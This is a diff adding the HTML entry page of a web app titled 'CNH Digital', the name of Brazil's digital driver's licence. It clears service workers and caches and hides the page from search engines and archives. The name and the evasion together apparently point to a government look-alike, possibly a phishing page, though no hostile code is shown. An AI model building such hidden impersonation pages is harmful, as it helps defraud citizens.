@@ -1,0 +1,58 @@
+<!doctype html>
+<html lang="pt-BR">
+
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+
+    <!-- FORÇAR LIMPEZA DE SERVICE WORKERS E CACHE DO NAVEGADOR -->
+    <script>
+      (function () {
+        try {
+          if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.getRegistrations().then(function (registrations) {
+              for (let registration of registrations) {
+                registration.unregister();
+              }
+            });
+          }
+          if ('caches' in window) {
+            caches.keys().then(function (names) {
+              for (let name of names) caches.delete(name);
+            });
+          }
+        } catch (e) {}
+      })();
+    </script>
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="Expires" content="0" />
+
+    <!-- Anti-indexação: invisível para mecanismos de busca -->
+    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex" />
+    <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet" />
+    <meta name="bingbot" content="noindex, nofollow" />
+    <meta name="slurp" content="noindex, nofollow" />
+    <meta name="duckduckbot" content="noindex, nofollow" />
+    <meta name="teoma" content="noindex, nofollow" />
+    <meta name="ia_archiver" content="noindex, nofollow" />
+    <meta name="referrer" content="no-referrer" />
+
+    <meta name="theme-color" content="#002e6e" />
+    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="apple-touch-icon" href="/img/logo_cnh.png" />
+    <link href="https://fonts.googleapis.com/css2?family=Rawline:wght@300;400;600;700&family=Raleway:wght@400;600;700&family=Roboto:wght@400;500;700&family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <title>CNH Digital</title>
+    <script type="module" crossorigin src="/assets/index-DcyrA5Hk.js"></script>
+    <link rel="modulepreload" crossorigin href="/assets/vendor-DKNdvlrE.js">
+    <link rel="modulepreload" crossorigin href="/assets/vendor-pdf-BEDFHtjV.js">
+    <link rel="stylesheet" crossorigin href="/assets/index-BUwg9OwT.css">
+  </head>
+
+  <body>
+    <div id="root"></div>
+  </body>
+
+</html>
+
